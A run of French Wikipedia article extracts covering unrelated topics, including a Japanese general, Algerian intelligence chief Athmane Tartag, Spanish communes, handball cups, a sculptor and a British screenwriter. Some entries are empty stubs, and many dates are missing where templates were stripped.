L'histoire de sa traversée de fait de lui un héros national japonais et lui vaut l'Ordre du Trésor sacré de troisième classe. Après son retour au Japon, Fukushima a fait don de ses chevaux au zoo d'Ueno à Tokyo, où ils sont rapidement devenus de célèbres attractions touristiques.
Révolte des Boxers et guerre sino-russo-japonaise.
Il a pris part à la répression de la révolte des Boxers où il officiait à la tête des forces japonaises à Tianjin, ainsi que la légation étrangère. Il revient brièvement à l'Académie Armée impériale japonaise afin d'étudier auprès du général allemand Jacob Meckel.
Après la victoire sur les Boxers, en tant qu'officier major général, Fukushima a visité l'Égypte, la Turquie ottomane, la Perse, l'Arabie, l'Inde, la Birmanie, le Siam et le Turkestan. En 1902, il a représenté l'empereur Meiji au couronnement du roi Édouard VII de Grande-Bretagne et d'Irlande et a participé à des négociations diplomatiques sécrètes derrière l'Alliance anglo-japonaise. Il a reçu les Honneurs de Chevalier-commandeur de l'Ordre du Bain.
Fukushima a également servi avec distinction dans la guerre sino-japonaise (1894-1895), et dans la guerre russo-japonaise (1904 à 1905).
Distinctions et fin de vie.
En 1907, Fukushima a été élevé au titre de "danshaku" (baron) en vertu du système kazoku. Du 26 avril 1912 au 15 septembre 1914, il a servi comme gouverneur général du Guandong. En 1914, il est promu général et a été transféré à la seconde réserve. Après le transfert, il a servi comme vice-président de l'Association des réservistes.
Fukushima étant en bons termes avec son compatriote poète, le général Akashi Motojirō, les deux hommes ont échangé des idées sur les besoins à long terme des services secrets japonais dans la région asiatique.
Fukushima est mort à 67 ans, et sa tombe se trouve au cimetière d'Aoyama à Tokyo. Le musée Matsumoto à Matsumoto (préfecture de Nagano), conserve certains de ses objets personnels.

</doc>
<doc id="9411684" url="https://fr.wikipedia.org/wiki?curid=9411684" title="Langues quechuas">
Langues quechuas



</doc>
<doc id="9411687" url="https://fr.wikipedia.org/wiki?curid=9411687" title="Weedon">
Weedon

Le terme Weedon désigne notamment :

</doc>
<doc id="9411689" url="https://fr.wikipedia.org/wiki?curid=9411689" title="Super Coupe d'Europe de handball">
Super Coupe d'Europe de handball



</doc>
<doc id="9411693" url="https://fr.wikipedia.org/wiki?curid=9411693" title="Horcajo de Montemayor">
Horcajo de Montemayor

Horcajo de Montemayor est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9411695" url="https://fr.wikipedia.org/wiki?curid=9411695" title="Supercoupe d'Europe masculine de handball 2008">
Supercoupe d'Europe masculine de handball 2008

La Supercoupe d'Europe masculine de handball 2008 est la et dernière édition de la compétition qui a eu lieu les 20 et dans la Veszprém Aréna de Veszprém en Hongrie.
Elle est remportée par le BM Ciudad Real pour la .
Équipes engagées et formule.
Les équipes engagées sont :
Le format de la compétition est une phase finale à 4 (demi-finale, finale et match pour la ) avec élimination directe.

</doc>
<doc id="9411696" url="https://fr.wikipedia.org/wiki?curid=9411696" title="Miss World Europe">
Miss World Europe

Miss World Europe est un concours de beauté issu de Miss Monde, donné à la miss européenne la mieux classée à l’élection de Miss Monde.
Présentation du concours.
Histoire.
Ce titre est accordé à la gagnante « européenne » depuis 1981, lors de chaque élection de Miss Monde.
Déroulement.
Les candidates participantes à l’élection sont issues des pays de l’Europe géographique, incluant aussi la Turquie, Guernesey, l'Île de Man, Jersey, l'Irlande du Nord, l'Israël, le Pays de Galles et Gibraltar.
Lauréates.
Depuis 2018, la gagnante de Miss Monde n’est plus titrée reine de continent.
Par exemple, Miss Monde 2018 venant du Mexique n’a pas été titré Miss Monde Amériques.

</doc>
<doc id="9411701" url="https://fr.wikipedia.org/wiki?curid=9411701" title="Horcajo Medianero">
Horcajo Medianero

Horcajo Medianero est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9411702" url="https://fr.wikipedia.org/wiki?curid=9411702" title="Fosetyl-aluminium">
Fosetyl-aluminium



</doc>
<doc id="9411704" url="https://fr.wikipedia.org/wiki?curid=9411704" title="La Hoya">
La Hoya



</doc>
<doc id="9411708" url="https://fr.wikipedia.org/wiki?curid=9411708" title="La Hoya Argentine)">
La Hoya Argentine)



</doc>
<doc id="9411711" url="https://fr.wikipedia.org/wiki?curid=9411711" title="Supercoupe d'Europe féminine de handball">
Supercoupe d'Europe féminine de handball

La Supercoupe d'Europe féminine de handball est une ancienne compétition de handball organisée par l'EHF qui a existé de 1994 à 2008, année de son abandon.
La compétition se déroulait entre quatre clubs : les vainqueurs de la Ligue des champions (C1), de la Coupe des coupes (C2) et de la Coupe de l'EHF (C3) de l'année précédente ainsi que, suivant les éditions, le vainqueur de la Coupe des Villes (C4), le finaliste de la Ligue des champions ou un club organisateur.

</doc>
<doc id="9411717" url="https://fr.wikipedia.org/wiki?curid=9411717" title="Escadron d'appui aérien 2/21 Oranie">
Escadron d'appui aérien 2/21 Oranie

L'escadron d'appui aérien 2/21 Oranie est une ancienne unité de chasse de l'armée de l'air française, rattachée à la 21e escadre de chasse qui a été basée en Algérie et à Madagascar.

</doc>
<doc id="9411719" url="https://fr.wikipedia.org/wiki?curid=9411719" title="Supercoupe d'Europe de handball">
Supercoupe d'Europe de handball



</doc>
<doc id="9411722" url="https://fr.wikipedia.org/wiki?curid=9411722" title="Eva Melander">
Eva Melander

Eva Melander, née à Gävle le , est une actrice suédoise.
Elle est principalement connue pour avoir interprété la mère de Sebbes dans le film primé aux Guldbagge, "" (2010). Melander a également joué dans "L'Hypnotiseur" (2012) de Lasse Hallström.
Biographie.
Eva Melander suit sa formation théâtrale à l' et a joué dans plusieurs productions théâtrales au et au et au .
Distinctions.
Guldbagge Award de la meilleure actrice, Border 2019

</doc>
<doc id="9411726" url="https://fr.wikipedia.org/wiki?curid=9411726" title="Athmane Tartag">
Athmane Tartag

Athmane Tartag (en arabe : عثمان ﻃﺮﻃﺎﻕ), connu aussi comme Bachir Tartag (en arabe : ﺑﺸﻴﺮ طرطﺎق), né au début des années 1950 à El Eulma dans l'actuelle wilaya de Sétif, est un général algérien qui avait dirigé la lutte anti-terroriste pendant la période dite Décennie noire (1990-2000) en Algérie. 
Chef du Département du renseignement et de la sécurité (DRS) de 2015 à 2016, puis coordinateur des services de sécurité (CSS) de 2016 à 2019, il est arrêté le 4 mai 2019. 
Biographie.
On connaît très peu de choses sur sa biographie, à l'instar de la plupart des chefs de l'armée algérienne - particulièrement s'agissant d'officiers supérieurs du renseignement et de la sécurité - dont l'état civil relève presque du secret d’État.
Né au début des années 1950 à El Eulma, Il est recruté par la Sécurité militaire en 1972 et, après un stage d’une année à Moscou à l’école du KGB, il est affecté à Tindouf dans la région militaire avec le grade de lieutenant.
En 1990, il est chargé des opérations au sein de l’état-major à l'intérieur duquel il est connu pour avoir dirigé le Centre principal militaire d'investigations (CPMI). En 1999, à l'arrivée de Bouteflika aux affaires, il est mis à la retraite avant d'être rappelé en décembre 2011, à la tête de la Direction de la sécurité intérieure (DSI). Devenu 2 du DRS, il assure le commandement de l'intervention militaire lors de l'attaque terroriste du site gazier d'In Amenas, à la suite de quoi il est à nouveau mis à la retraite en juillet 2014. 
Il est rappelé en octobre de la même année pour occuper le poste de conseiller à El Mouradia, puis en septembre 2015 pour remplacer le général Mohamed Mediène dit « Toufik » à la tête du Département du renseignement et de la sécurité (DRS), après que ce dernier y a passé plus de vingt ans. 
Avant cette nomination, le DRS est diminuée de plusieurs prérogatives dont celle de mener des enquêtes sur les affaires de corruption, les dernières enquêtes ayant éclaboussé des proches du pouvoir. D'après certains spécialistes, cela pourrait signifier la fin du mythique DRS, qui a dirigé le pays pendant plus de cinquante ans (soit depuis le coup d'État du colonel Boumédiène contre Ben Bella en juin 1965, alors Kasdi Merbah était nommé chef du SM).
Athmane Tartag procède à d'importantes modifications au sein du DRS limogeant notamment une dizaine d'officiers et de hauts gradés du DRS proches du chef d'état-major Ahmed Gaïd Salah afin de s'assurer les pleins pouvoirs sur les nouvelles entités du renseignement algérien.
Le 27 mars, dans le contexte du Hirak, Saïd Bouteflika, Athmane Tartag, Mohamed Mediène et Louisa Hanoune se réunissent dans une résidence militaire pour décider du renvoi du chef de l'armée, Ahmed Gaïd Salah, et le maintien de Bouteflika en échange de la nomination d'un nouveau Premier ministre chargé de mettre en place la transition promise mi-mars. Après avoir hésité sur le nom du Premier ministre, ils choisissent l'ancien président de la République Liamine Zéroual, qui décline après avoir accepté, invoquant des raisons de santé et le refus du plan par les manifestants.
Le 5 avril 2019, il est démis de ses fonctions de coordinateur des services de sécurité (CSS), dans le contexte de la démission du président Abdelaziz Bouteflika. Ahmed Gaïd Salah désigne alors le général Mohamed Kaidi à la tête des services de sécurité (sauf le renseignement militaire), pour remplacer Athmane Tartag. 
Arrestation et procès au tribunal militaire.
Le 4 mai, il est arrêté puis placé en détention provisoire pour et , en même temps que Saïd Bouteflika et son prédécesseur Mohamed Mediène. Le procès est fixé au 23 septembre.
Lors du procès, qui a eu lieu le 23 septembre, Athmane Tartag a été jugé en compagnie d'autres accusés, notamment Saïd Bouteflika, frère de l'ex-président algérien Abdelaziz Bouteflika, Mohamed Mediène, ancien patron du DRS et Louisa Hanoune, secrétaire général du Parti des travailleurs.
Athmane Tartag ne s'est pas présenté au tribunal. Le juge a rappelé qu'il ne le jugerait pas par contumace et a décidé de prendre des dispositions légales à son encontre. Il était le seul absent. Au deuxième jour du procès, le procureur général du tribunal militaire de Blida a requis une peine de prison de 20 ans à l'encontre de tous les accusés. 
Au troisième jour, le juge a prononcé une peine de 15 ans de prison à l'encontre de Athmane Tartag, pour « complot avec des réunions » visant à « porter atteinte à l’autorité de l'État et de l'Armée ».
Le 26 septembre, il fait appel du verdict. Le procès en appel d'Athmane Tartag, Mohamed Mediène, Louisa Hanoune et Saïd Bouteflika se tient devant la cour d'appel militaire de Blida à partir du 9 février 2020. Sa peine de 15 ans de prison est confirmée.
Le 2 janvier 2021, après un pourvoi en cassation, il est acquitté par la Cour d'appel militaire de Blida. Il est maintenu emprisonné dans la prison militaire de Blida pour répondre d'autres accusations. En mars 2022, il est condamné à 6 ans de prison pour .
Controverses.
Tartag et l'assassinat politique.
Pour Mohammed Samraoui, ancien haut responsable des services secrets de l'armée algérienne : « La manière dont a été liquidé l'ex-chef du gouvernement Kasdi Merbah dénote le professionnalisme des auteurs, qui disparurent une fois leur forfait accompli, non sans avoir pris soin de récupérer son porte-document (mais pas son arme). Cette opération réalisée en 1993, dont le nom de code était , est relatée en détail dans un article publié en 1999 sur le site du MAOL "Opération virus". Les hommes du commando de tueurs faisaient partie de l'unité 192 et ils étaient dirigés par le colonel Tartag lui-même. Je ne sais pas si cette version est exacte, car mes sources affirment que cette opération a été montée par la DCE et non la DCSA, en raison de la participation de Kaci Abdallah, qui est un agent de Smaïn Lamari. Toutefois, il se peut que la DCSA et la DCE aient collaboré pour liquider Kasdi Merbah. Quel que soit le service engagé, une chose est sûre, cette affaire est un coup tordu du DRS. » .
Mohamed Samraoui : « Tartag assumait alors les vilains coups de Kamel Abderrahmane, mais le colonel Tartag, lui, une sorte de Mengele à l'algérienne dont j'aurai l'occasion de reparler, saura échapper aux mauvais coups liés à son "sale boulot", il restera en fonction jusqu'en mars 2001, et il est toujours vivant à ce jour promu au grade de général et assurant les fonctions de conseiller spécial du DRS ; le général Toufik. » .
Tartag et les services étrangers.
Selon les journalistes Christophe Dubois et Marie-Christine Tabet : « Sur le plan opérationnel, les interlocuteurs des services français sont le général-major Athmane Tartag et le général Hassan, deux hauts gradés très puissants dans l’appareil sécuritaire algérien : ‘On a des réunions techniques avec eux, témoigne un policier spécialisé. Des échanges de télégrammes, des notes techniques, très poussées… Nous avons aussi des actions communes, notamment des opérations d’infiltration. » 
Pour le dissident Lyes Laribi : « Le commandant Emmanuel D., ancien officier du renseignement sous le régime de l’apartheid, aurait été chargé de la collecte des renseignements sur les réseaux islamistes dans le monde. Il aurait été derrière une réunion de travail entre les services israéliens et algériens en Italie. Le capitaine Stephan D., ancien officier du contre-espionnage sud-africain, est présenté comme un spécialiste de la torture dite « scientifique ». Il est proche du général Tartag. Enfin, le commandant Uri B., ancien officier de l’armée sud-africaine, a aussi la nationalité israélienne. Il aurait effectué des achats d’armements pour l’armée algérienne chez les Israéliens. Il supervise les entraînements des forces spéciales à Biskra. Il est considéré comme proche de l’ancien ambassadeur algérien en Afrique du Sud. » 
Tartag et le GIA.
Mohammed Samraoui : « C'est alors, raconte Chouchane, que le colonel Athmane Tartag lui répliqua : "Laisse Zitouni tranquille, c'est notre homme ; c'est avec lui que tu vas travailler". Lors de son dernier entretien, le général Kamel Abderrahmane expliqua au capitaine Chouchane qu'en contrepartie, il recevrait le grade de colonel et qu'il n'aurait aucun souci à se faire pour sa famille. » 

</doc>
<doc id="9411733" url="https://fr.wikipedia.org/wiki?curid=9411733" title="La Danse de l'oubli">
La Danse de l'oubli



</doc>
<doc id="9411739" url="https://fr.wikipedia.org/wiki?curid=9411739" title="Fête foraine d'Orléans">
Fête foraine d'Orléans

La fête foraine d'Orléans est une fête foraine française organisée par la ville d'Orléans via Orléans Métropole événementiel située dans le département du Loiret en région Centre-Val de Loire.
La fête a lieu chaque année pendant trois semaines entre la fin du mois de mai et le début du mois de juin, juste après le "Set Electro d'Orléans", déménagera à Fleury-les-Aubrais à partir de 2019.
Situation et accès.
La fête foraine d'Orléans se déroule depuis 2019 sur le site stade de la Vallée à proximité du Chapit'O dans la commune de Fleury-les-Aubrais.
L'accès s'effectue via les lignes de bus 11 et CO via l'arrêt "Petit-Pré" et "Chapit'O", la route départementale 2020 ou la rue Fernand et Marcelle Rivière.
Historique.
La fête foraine puisait son origine dans les boulevards du centre-ville.
À la fin du , la fête change d'emplacement pour s'installer dans le quartier du théâtre d'Orléans.
À partir de 1974, elle quitte le centre-ville pour s'installer sur le parking du parc des expositions et des congrès d'Orléans.
Depuis l'édition de 2019 et à la suite de la démolition du parc des expositions, la fête foraine se déroule sur le site du stade de la Vallée, à Fleury-les-Aubrais.
Mais en 2020 et 2021, la fête fut annulée a cause de la crise sanitaire.
Affaire du train fantôme "Horror Show".
Le a lieu un grave accident : un des wagons du train fantôme "Horror Show" chute de , entraînant avec deux adolescentes de 15 et 19 ans. Celles-ci sont dans le coma pendant une semaine, et souffrent de graves traumatismes crâniens. Une expertise a démontré des défauts de montage dudit train fantôme. Le propriétaire de l'attraction a été mis en examen, ainsi qu'un de ses employés. Six mois ferme ont été requis contre le premier, quatre contre le second, lors de l'audience du ; le jugement sera rendu le .
Lien externe.
La fête foraine sur le site du parc des expositions

</doc>
<doc id="9411745" url="https://fr.wikipedia.org/wiki?curid=9411745" title="Agent Spécial Oso">
Agent Spécial Oso

Agent Spécial Oso (") ou Ourson L'Agent Spéciale au Québéc est une série télévisée américaine en (réparties en 122 segments) diffusée à partir du sur Playhouse Disney et sur Disney Junior jusqu'au .
Au Québec, la série a été diffusée du sur Radio-Canada. 
Synopsis.
Oso est un adorable petit ourson qui apprend à devenir agent secret. Il entraîne les enfants dans des missions spéciales qui les aident à faire des tâches de tous les jours comme ranger leur chambre.

</doc>
<doc id="9411746" url="https://fr.wikipedia.org/wiki?curid=9411746" title="Matt Moore">
Matt Moore

Matt Moore peut désigner :

</doc>
<doc id="9411748" url="https://fr.wikipedia.org/wiki?curid=9411748" title="Bachir Tartag">
Bachir Tartag



</doc>
<doc id="9411750" url="https://fr.wikipedia.org/wiki?curid=9411750" title="La Hoya (Castille-et-León)">
La Hoya (Castille-et-León)

La Hoya est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9411756" url="https://fr.wikipedia.org/wiki?curid=9411756" title="Clarisse Lévy-Kinsbourg">
Clarisse Lévy-Kinsbourg

Clarisse Lévy-Kinsbourg, née le à Saint-Maurice (Seine) et morte à Paris () le , est une sculptrice française de la période Art déco dont les œuvres sont en grande partie d'inspiration coloniale.
Biographie.
Clarisse Kinsbourg, fille d'Edmond Gintzburger dit Kinsbourg (1866-1940), marchand de chevaux, et de Rachel Grosmutts (1862-1925), naît le dans le Val-de-Marne, 23 allée de l'Asile à Saint-Maurice.
Le , âgée de , elle épouse à Paris Roger Lévy (1892-1980), un étudiant en droit âgé de .
Elle entre à l'École des beaux-arts de Paris vers 1919 et est l'élève de Laurent Marqueste (1848-1920), prix de Rome, de Victor Ségoffin (1867-1925), chef de l'atelier de sculpture pour femmes à l'École des beaux-arts de Paris, Auguste Carli (1868-1930), second Prix de Rome, ainsi que de François Sicard (1862-1934), lauréat du Prix de Rome et membre de l'Académie des beaux-arts. Elle présente ses premières œuvres d'atelier au Salon des Artistes français tout au long des années 1920.
Son mari, conseiller juridique et fiscal de la Maison Van Cleef et administrateur de Sociétés coloniales, quitte le domicile conjugal en 1928. Clarisse conserve son atelier où le couple s'était installé quelques années auparavant dans le quartier Montparnasse, au 36 avenue de Châtillon (Paris ). Le divorce entre les deux époux est prononcé le par le tribunal de la Seine à la requête et au profit de Clarisse Lévy-Kinsbourg.
Elle se passionne très tôt pour les arts exotiques qui sont dans l'air du temps, comme en témoignent les succès de l'Exposition coloniale de Marseille en 1922 et de l'Exposition coloniale internationale de Paris en 1931, et s'engage alors dans une carrière qui lui fait quitter régulièrement son atelier parisien pour se rendre dans les colonies et protectorats français grâce aux nombreuses bourses qui lui sont accordées par la Société coloniale des artistes français. Elle y puise son inspiration tant pour ses nus féminins, son thème de prédilection, que pour des scènes de femmes dans leur vie quotidienne. Elle expose régulièrement au Salon des artistes français et aux expositions de la Société coloniale des artistes français.
Après la seconde guerre mondiale, les tensions croissantes dans les pays d'outre-mer en quête d'indépendance entraîne un certain désintérêt du public pour l'art colonial. Clarisse Lévy-Kinsbourg maintient malgré tout ses séjours réguliers hors de la métropole et poursuit sa participation aux expositions de la Société des beaux-arts de la France d'outre-mer.
En 1950, elle quitte la Tunisie où elle a longtemps œuvré afin de poursuivre ses expositions à Paris et de préparer des voyages d'études vers de nouveaux horizons, en Égypte et en Suède.
Après quelques dernières participations aux expositions organisées par la Société des beaux-arts de la France d'outre-mer, Clarisse Kinsbourg s'éteint le à l'hôpital Broussais 96 rue Didot (Paris ) et est inhumée le dans le carré juif du cimetière du Montparnasse.
Œuvre.
La carrière artistique de Clarisse Lévy-Kinsbourg connaît deux grandes périodes.
Années 1920.
Clarisse Lévy suit le cursus classique de formation à l'École des beaux-arts : études, poses d'atelier, plâtres. Soutenue par ses professeurs successifs elle présente ses premières œuvres d'atelier au Salon des Artistes français.
Dans le même temps elle produit de nombreuses autres sculptures dans le style Art déco qui mettent en valeur l'esthétisme du corps de la femme ou évoquent des thèmes intemporels dans des poses de nus reflétant son expérience acquise aux Beaux-arts.
Ces sculptures sont diffusées sous des signatures multiples « Claris Lévy, Clarisse Lévy, C. Lévy » par des éditeurs de renom : en bronze par les fondeurs Arthur Goldscheider, R. Patrouilleau, Ancienne Maison Colin, Susse Frères et Valsuani, en terre cuite ou en céramique par Kaza, éditeur de céramiques réputé de la fin des années 1920 et des années 1930 au 27 rue de Paradis à Paris () qui propose en particulier des craquelés de grande taille particulièrement appréciés par une clientèle aisée de l'époque. 
À partir de la fin des années 1920.
La seconde période de sa carrière, à partir de la fin des années 1920, correspond à ses séjours dans les colonies et protectorats français. C'est le début de ses premiers vrais succès dans les expositions du Salon des artistes français. Ses œuvres sont signées « Clarisse Lévy-Kinsbourg » ou « C. Lévy-Kinsbourg » et, plus tard, « C. Kinsbourg-Lévy », « C.L. Kinsbourg », « L-Kinsbourg »ou simplement « Kinsbourg ».
En 1929, elle expose au Grand Palais une statue de pierre -"Mulâtresse joueuse de dés-", probablement un aboutissement de la statue en plâtre qui lui valut une mention honorable en 1923. Elle reçoit une médaille d'argent pour cette nouvelle œuvre. La Ville de Paris en fait l'acquisition pour le Petit Palais. Cette sculpture sera ensuite éditée en bronze sur socle de marbre. La même année, elle reçoit le prix de Madagascar en suppléante.
En 1930, elle présente un buste en marbre jaune de Sienne -"Tête asiatique"- aux côtés d'un de ses maîtres François Sicard.
En 1931, elle réalise pour le Salon des artistes français une statue en pierre de Pouillenay -"Danseuse cambodgienne"- dont la ville de Paris fait l'acquisition. Elle sera par la suite éditée en bronze par Susse Frères en différents formats. Le prix de la Compagnie Paquet lui est attribué par la Société coloniale des artistes français.
En 1932, elle reçoit le prix Louis-Dumoulin pour l'Algérie en suppléante. À la suite de l'exposition au Salon des artistes français, la Ville de Paris fait l'acquisition de "Jeune fille slave", torse de marbre rose signé « C. Lévy-Kinsbourg.
En 1933, elle expose un buste en onyx du Maroc -"Jeune Marocaine de Fez-", un buste en marbre jaune de Sienne "-Femme africaine-" et un buste en bronze "-Martiniquaise-" au Salon colonial des artistes français"." Par ailleurs, choisie parmi 17 candidats, la Ville de Paris lui attribue une bourse de 18000 F proposée par la Société coloniale des artistes français pour un séjour artistique d'un an en Afrique du Nord qui lui permet de se rendre l'année suivante au Maroc. 
La même année, elle participe à un concours organisé par la Ville de Paris pour la présentation d'un buste de Marianne, plâtre à patine bronze, intitulé "la République," photographié par Bernès-Marouteau &amp; Cie son voisin d'atelier. Parmi douze œuvres de sculpteurs réputés, celle de Clarisse Lévy-Kinsbourg, signée « L-Kinsbourg », est choisie par le jury en janvier 1934. Ce choix raisonnable ne souleva toutefois pas d'enthousiasme et n'échappa pas à quelques critiques parfois aux relents d'antisémitisme. Elle fut surtout éclipsée par la Marianne de Pierre-Marie Poisson commandée par Jean Mistler, sous-secrétaire d'État aux Beaux-arts, qui l'a fait inscrire au catalogue des Ateliers de moulage du Musée du Louvre.
En 1936, elle est invitée en même temps que son ex-beau-frère Marcel Armand Gaumont (1880-1962), lui aussi sculpteur, à l'exposition du dix-septième Groupe des "Artistes de ce temps" au Petit Palais et participe un mois plus tard à l'exposition du dix-huitième Groupe des "Artistes de ce temps".
En 1937, au Salon des artistes français et de la Société nationale des Beaux-arts, elle présente un buste d'une "Jeune arabe (ou Jeune fille de Marrakech)". Sur commande du musée d'Art moderne de Paris pour l'Exposition universelle, elle réalise une statue de pierre reconstituée de intitulée "Femme orientale debout" et signée « C.L. Kinsbourg » qui lui vaut une médaille d'or, actuellement dans les collections du musée.
En 1939, elle expose un buste en marbre -"Tunisienne du bled"- ainsi qu'un buste en pierre -"Petite fille Chleuh-". Au Salon de la Société coloniale elle reçoit le prix de l'Afrique occidentale française en suppléante.
En 1940, au Salon de la France d'Outre-mer au Grand Palais, elle propose un buste de pierre -"Algérienne"-, un buste de plâtre -"Jeune Tunisienne"- et une vitrine contenant des sujets coloniaux. Elle reçoit le prix Louis-Dumoulin pour l'Algérie et, en suppléante, le prix de l'Afrique occidentale française.
En 1946, au Salon des beaux-arts de la France d'outre-mer, elle présente -"Tête africaine-" en marbre jaune de Sienne et un buste en marbre rose intitulé "Jeune fille porteuse d'eau" signés "Kinsbourg".
En 1948, à ce même Salon elle propose deux bustes en plâtre -"Bédouine, région de Bizerte"- et -"Fillette de Tunis"- ainsi qu'une sculpture en bois en taille directe intitulé "Jeune Algérienne au turban".
En 1949, elle expose une tête en plâtre stéariné -" Solange Cang"- et un nu féminin en bronze -"Jeune Martiniquaise se coiffant"-.
En 1950, elle présente un plâtre -"Buste de Lucette, Le Trung-Cang-" signé « Kinsbourg ». Deux bourses de voyage lui sont encore attribuées au Salon de la France d'outre-mer : le prix de Madagascar et, en suppléante, le prix de la Tunisie.
En 1955, trois sculptures sont exposées au Grand Palais : un buste en céramique -"Martiniquaise-", un buste en pierre -"Bédouine-", une statuette en terre cuite -"Maternité (Bédouine)(Marocaine)-".
En 1957,elle propose un buste en bronze -"Dallal-", un nu féminin en bronze doré -"Danseuse cambodgienne"- et un buste en marbre jaune de sienne -"Africaine-".

</doc>
<doc id="9411758" url="https://fr.wikipedia.org/wiki?curid=9411758" title="Approximation de Stirling">
Approximation de Stirling



</doc>
<doc id="9411760" url="https://fr.wikipedia.org/wiki?curid=9411760" title="Clancy Cooper">
Clancy Cooper

Clancy Cooper est un acteur américain, né le à Boise (Idaho), mort le à Los Angeles (quartier d'Hollywood, Californie).
Biographie.
Au théâtre à Broadway (New York), Clancy Cooper joue dans huit pièces de 1938 à 1941, dont "The Fabulous Invalid" de Moss Hart et George S. Kaufman (1938, avec Jack Arnold) et "Night Music" de Clifford Odets (1940, avec Elia Kazan et Jane Wyatt).
Au cinéma, comme second rôle de caractère ou dans des petits rôles non crédités — souvent de policier —, il contribue à cent-dix-sept films américains (parfois en coproduction) sortis entre 1938 et 1962, dont des westerns.
Mentionnons "L'Engrenage fatal" d'Anthony Mann (1947, avec John Ireland et Jane Randolph), "Les Aventures du capitaine Wyatt" de Raoul Walsh (1951, avec Gary Cooper et Mari Aldon), "La Perle noire" de Richard Thorpe (1953, avec Robert Taylor et Stewart Granger) et "Le Temps d'aimer et le Temps de mourir" de Douglas Sirk (1958, avec John Gavin et Liselotte Pulver).
À la télévision, outre deux téléfilms diffusés respectivement en 1951 et 1960, Clancy Cooper apparaît surtout dans cinquante séries américaines de 1951 à 1972, dont "Rintintin" (trois épisodes, 1955-1957), "Alfred Hitchcock présente" (deux épisodes, 1960), "La Quatrième Dimension" (un épisode, 1961) et "Les Mystères de l'Ouest" (un épisode, 1965).

</doc>
<doc id="9411763" url="https://fr.wikipedia.org/wiki?curid=9411763" title="Ꜳ́">
Ꜳ́

Ꜳ́ (minuscule ꜳ́) est une voyelle et un graphème utilisé en vieux norrois au Moyen Âge. C’est une ligature appelée « double a accent aigu », « a dans l’a accent aigu », « a a liés accent aigu », « a a collés accent aigu » ou « aa accent aigu ».
Représentations informatiques.
L’a dans l’a accent aigu peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="9411764" url="https://fr.wikipedia.org/wiki?curid=9411764" title="Niccolò III d'Este">
Niccolò III d'Este



</doc>
<doc id="9411766" url="https://fr.wikipedia.org/wiki?curid=9411766" title="Huerta (Castille-et-León)">
Huerta (Castille-et-León)

Huerta est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9411767" url="https://fr.wikipedia.org/wiki?curid=9411767" title="Dave Dee, Dozy, Beaky, Mick &amp; Tich">
Dave Dee, Dozy, Beaky, Mick &amp; Tich



</doc>
<doc id="9411774" url="https://fr.wikipedia.org/wiki?curid=9411774" title="Iruelos">
Iruelos

Iruelos est une commune de la province de Salamanque dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9411776" url="https://fr.wikipedia.org/wiki?curid=9411776" title="Tumulus de Bussy-le-Château">
Tumulus de Bussy-le-Château



</doc>
<doc id="9411781" url="https://fr.wikipedia.org/wiki?curid=9411781" title="(1812) Gilgamesh">
(1812) Gilgamesh

(1812) Gilgamesh est un astéroïde de la ceinture principale.
Description.
(1812) Gilgamesh est un astéroïde de la ceinture principale. Il fut découvert par Cornelis Johannes van Houten, Ingrid van Houten-Groeneveld et Tom Gehrels le 24 septembre 1960 à l'observatoire Palomar. Il présente une orbite caractérisée par un demi-grand axe de 3 UA, une excentricité de 0,08 et une inclinaison de 10,27° par rapport à l'écliptique.
Il fut nommé en hommage à Gilgamesh personnage héroïque de la Mésopotamie antique, roi de la cité d'Uruk où il aurait régné vers 2650 av. J.-C., ainsi qu'un dieu des Enfers dans la mythologie mésopotamienne.

</doc>
<doc id="9411782" url="https://fr.wikipedia.org/wiki?curid=9411782" title="Château de Vauban">
Château de Vauban

Le château de Vauban, est une maison-forte du , au hameau de Vauban sur la commune de Bazoches, en Morvan dans la province de Bourgogne.
Historique.
Ce château n'était au qu'une simple maison-forte destinée à surveiller la route de Vézelay à Lormes. Au les deux fiefs de Champignolle Haut et Bas appartiennent à Jean de Saillenay. En 1284, l'un des deux fiefs est vendu à Jean de Bazoches. De 1403 à 1486, il revient à la Maison de Champignolle dont Guillaume de Champignolle est le seigneur.
Armoiries.
, bâton de maréchal en sautoir, croix de l'ordre du Saint Esprit, couronne de marquis.

</doc>
<doc id="9411783" url="https://fr.wikipedia.org/wiki?curid=9411783" title="Élections législatives norvégiennes de 1973">
Élections législatives norvégiennes de 1973

Les élections législatives norvégiennes de 1973 ("Stortingsvalet 1973", en norvégien) se sont tenues le , afin d'élire les cent cinquante-cinq députés du Storting pour un mandat de quatre ans.

</doc>
<doc id="9411787" url="https://fr.wikipedia.org/wiki?curid=9411787" title="Stephen Wyatt">
Stephen Wyatt

Stephen Wyatt est un scénariste britannique né le à Beckenham dans le Kent. Il est principalement connu pour ses scénarios pour la télévision et le théâtre.
Biographie.
Débuts.
Élevé à Ealing dans l'ouest de Londres, il fait ses études au "Latymer Upper School" de Londres puis au Clare College de l'université de Cambridge. Après une brève expérience comme conférencier à l'université de Glasgow, il se lance en 1975 dans l'écriture de scénarios pour le "Belgrade Theatre" de Coventry.
Œuvres de théâtre.
Il débute dans l'écriture de pièces pour enfants comme "The Magic Cabbage"(Unicorn 1978), "Monster" (York Theatre Royal 1979) et "The Witch of Wapping" (Half Moon 1980). De 1982 à 1983 il devient résident du Bubble Theatre et écrit les pièces "Glitterballs" et "The Rogue's Progress".
Il écrit aussi les pièces "After Shave" (Apollo Theatre 1978), "R.I.P Maria Callas" (Edinburgh Festival / Hen and Chickens 1992), "A working woman" (from Zola's L'Assommoir) (West Yorkshire Playhouse 1992) et "The Standard Bearer" (Man in the Moon 2001). Il collabore en 2004 avec Jeff Clarke sur une pièce nommée "The Burglar's Opera".
Œuvres de télévision.
Son premier travail pour la télévision fut "Claw" un téléfilm de la BBC de 1987 avec Simon Jones et Brenda Blethyn. Il écrit aussi deux épisodes de la série de science fiction "Doctor Who" : « "Paradise Towers" » en 1987 et « "The Greatest Show in the Galaxy" » en 1988 avec Sylvester McCoy dans le rôle du Docteur. Il écrit aussi pour les séries "The House of Eliott" et "Casualty".
Radio.
Depuis 1985 il travaille sur BBC Radio à la fois pour adapter des romans et pour écrire des pièces originales.
Récompenses.
